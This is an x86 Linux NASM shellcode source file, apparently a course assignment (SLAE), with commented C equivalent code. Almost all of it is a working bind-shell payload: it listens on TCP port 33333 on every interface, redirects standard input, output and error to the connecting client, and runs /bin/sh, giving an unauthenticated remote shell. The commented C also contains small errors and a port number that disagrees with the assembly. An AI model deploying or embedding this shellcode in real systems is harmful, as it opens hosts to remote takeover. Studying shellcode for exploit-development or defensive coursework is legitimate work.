; File: shellcode.nasm
; SLAE assignment 1


; 					EQUIVALENT C CODE
; 					sampled from C/echo_server/EC/echo_server.c
;	#include <stdio.h>
;	#include <strings.h>
;	#include <sys/socket.h>
;	#include <netinet/in.h>
;	
;	int main(void)
;	{	
;		// variables used
;		int sockfd, connfd;
;		struct sockaddr_in serv_addr;
;		int BACKLOG = 0;				// MAXCONN now defaults to implementation defined minimum value, usually 1?
;	
;		// socket call #102.1
;		sockfd = socket(AF_INET, SOCK_STREAM, 0);	// AF_INET = 2, SOCK_STREAM = 1 according to header files
;	
;		bzero(&serv_addr, sizeof(serv_addr));		// clearing out the server_addr struct, and configure it
;		serv_addr.sin_family = AF_INT;
;		serv_addr.sin_addr.s_addr = INADDR_ANY;		// INADDR_ANY = 0x0
;		serv_addr.sin_port = htons(3333);		
;
;		//bind call #102.2
;		bind(sockfd, (struct sockaddr *)&serv_addr), sizeof(serv_addr);		// sizeof(serv_addr) == 16 bytes
;		
;		//listen call #102.4
;		listen(sockfd, BACKLOG);
;
;		// accept call (remember this is a blocking call) #5
;		// &cli_addr (if not picky) = NULL, and &cli_size = NULL since cli_addr = NULL  
;		connfd = accept(fd, (struct sockaddr *)NULL, NULL); 
;
;		//redirect calls #63
;		dup2(connfd, 0);				// redirect stdinput to connfd
;		dup2(connfd, 1);				// redirect stdoutput to connfd
;		dup2(connfd, 2);				// redirect stderror to connfd
;		
;		// execve call #11
;		execve("/bin/sh", NULL, NULL); 			// launch shell
;		
;	}


; SYSTEM CALLS NEEDED:  platform=linux, arch=x86
; 			sys_socketcall 0x66
; 		net.h: 		sys_socket 1
;				sys_bind 2
;				sys_listen 4
;				sys_accept 5
;			sys_dup2 0x3f
;			sys_execve 0xb



global _start

section .text
_start:

	xor ebx, ebx			; zero out ebx
	mul ebx				; zero out eax, edx


	; socketfd  = socket(AF_INET, SOCK_STREAM, 0)	
	mov al, 0x66			; syscall 102 for sys_socket
	mov bl, 1			; first parameter 1 for socket call
	push edx			; protocol 0 for default protocol by ISP
	push ebx			; SOCK_STREAM = 1
	push 2				; AF_INET = 2	(also 4 bytes occupied array of int 2 as the first element)
	mov ecx, esp			; move socket paramter array into ecx
	
	int 0x80			; socket system call
	mov esi, eax			; move returned socketfd into esi
	
	
	; bind(socketfd, (struct sockaddr*)&serv_addr, sizeof(server_addr))
	mov al, 0x66			; syscall 102 for sys_socket
	inc ebx				; first parameter 2 for bind call
					; serv_addr struct configuration
	push edx			; INADDR_ANY = 0
	push word 0x3582		; /x82/x35 reverse lil endian for port 33333, could be configured 
	push word bx			; AF_INET family of streams
	mov ecx, esp			; grab address of serv_addr struct to ecx
					; bind param array	
	push 16				; sizeof(server_addr) = 16 bytes
	push ecx			; serv_addr struct address
	push esi			; socketfd 
	mov ecx, esp			; param array to ecx
	int 0x80			; execute syscall
		
	
	; listen(socketfd, BACKLOG) 
	mov al, 0x66			; sys call102 for sys_socket
	mov bl, 4			; first parameter 4 for listen
	push edx			; listen last param backlog = 0, for defaults to implementation min amount of max connections
	push esi			; listen first param socketfd
	mov ecx, esp			; param array in ecx
	int 0x80			; execute listen call
	
	
	; commfd = accept(socketfd, (struct sockaddr *)NULL, NULL)
	mov al, 0x66			; syscall 102 for sys_socket
	mov bl, 5			; first parameter 5 for accept call	
	push edx			; &sizeof(client_addr= NULL) = NULL
	push edx			; client_addr = NULL
	push esi			; socketfd
	mov ecx, esp			; param array to ecx
	int 0x80			; execute accept call
	xchg ebx, eax			; move returned value into ebx for dup2 first param
	

	; dup2(commfd, 2:0)	
	xor ecx, ecx			; zero out ecx, to be used as simple counter AND fd numbers, 2:error, 1:stdout, 0:stdin
	mov cl, 2			; start from two, finish by 0

	redirect_fd_loop:
		mov al, 0x3f		; sys_dup2 = 0x3f, eax might contain return value so we need to include this instrcution in loop
		int 0x80		; all param should be in place, invoke dup2
		dec ecx			; decrements ecx, so loops to 1 then 0, -1 ...
		jns redirect_fd_loop	; jns = jmp not signed once ecx reaches negative value, SF will set, and break out of loop
	

	; execve("bin/sh", ["bin/sh", NULL], NULL)
	mov al, 0xb			; 0xb for syscall 11 for execve
	xchg edi, edx			; putting edi to be 
	push edi			; push NULL
	push 0x68732f6e			; hs/n			//bin/sh in reverse
	push 0x69622f2f			; ib//
	mov ebx, esp			; execve first param
	push edi			; push NULL
	push ebx			; push //bin/sh NULL
	mov ecx, esp			; execve second param
	push edi			; PUSH NULL
	mov edx, esp			; execve third param
	int 0x80
	
		
				


















	
